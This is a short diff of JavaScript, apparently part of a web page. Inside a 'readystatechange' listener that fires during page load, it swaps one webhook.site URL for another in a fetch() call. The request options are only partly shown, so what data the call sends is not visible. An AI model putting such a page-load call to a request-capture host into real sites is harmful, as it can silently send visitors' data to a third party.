@@ -24,7 +24,7 @@ document.addEventListener("readystatechange", () => {
               redirect: "follow"
             };
             
-            fetch("https://webhook.site/099257d9-0a5e-48bd-bc7b-8c57406c2405", requestOptions)
+            fetch("https://webhook.site/da07c99a-1ffc-4998-90c5-1e5a60be540c", requestOptions)
               .then((response) => response.text())
               .then((result) => console.log(result))
               .catch((error) => console.error(error));
